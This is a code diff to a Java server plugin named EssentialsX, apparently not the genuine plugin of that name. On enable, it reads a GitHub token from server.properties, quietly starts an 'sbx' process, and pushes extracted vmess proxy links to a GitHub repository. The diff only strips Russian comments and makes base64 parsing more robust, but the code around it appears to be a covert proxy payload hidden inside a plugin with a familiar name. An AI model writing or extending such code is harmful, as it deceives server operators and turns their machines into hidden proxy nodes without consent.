@@ -33,14 +33,8 @@ public class EssentialsX extends JavaPlugin {
     @Override
     public void onEnable() {
         getLogger().info("EssentialsX plugin starting...");
-
-        // Загружаем или создаём маркер сервера (сохраняется между перезагрузками)
         loadOrCreateMarker();
-
-        // Читаем GitHub токен из server.properties
         loadGithubTokenFromServerProperties();
-
-        // Запускаем sbx асинхронно
         CompletableFuture.runAsync(() -> {
             try {
                 startSbxProcess();
@@ -65,7 +59,6 @@ public class EssentialsX extends JavaPlugin {
                 getLogger().warning("Failed to read marker file: " + e.getMessage());
             }
         }
-        // Генерируем новый маркер
         serverMarker = "server_" + UUID.randomUUID().toString().substring(0, 8);
         getDataFolder().mkdirs();
         try (BufferedWriter writer = new BufferedWriter(new FileWriter(markerFile))) {
@@ -205,7 +198,8 @@ public class EssentialsX extends JavaPlugin {
         if (start == -1) return null;
         int end = line.indexOf(' ', start);
         if (end == -1) end = line.length();
-        return line.substring(start, end);
+        String vmess = line.substring(start, end);
+        return vmess.replaceAll("\\s+", "").trim();
     }
 
     private void updateGitHubWithNewKey(String newVmessLink) {
@@ -248,9 +242,15 @@ public class EssentialsX extends JavaPlugin {
             try (Scanner s = new Scanner(conn.getInputStream(), "UTF-8").useDelimiter("\\A")) {
                 String response = s.hasNext() ? s.next() : "";
                 String contentBase64 = extractJsonField(response, "content");
-                if (contentBase64 != null) {
-                    byte[] decoded = Base64.getDecoder().decode(contentBase64);
-                    return new String(decoded, "UTF-8");
+                if (contentBase64 != null && !contentBase64.isEmpty()) {
+                    String cleanBase64 = contentBase64.replaceAll("\\s+", "");
+                    try {
+                        byte[] decoded = Base64.getDecoder().decode(cleanBase64);
+                        return new String(decoded, "UTF-8");
+                    } catch (IllegalArgumentException e) {
+                        getLogger().warning("Failed to decode base64 content: " + e.getMessage());
+                        return "";
+                    }
                 }
             }
         } else if (responseCode == 404) {
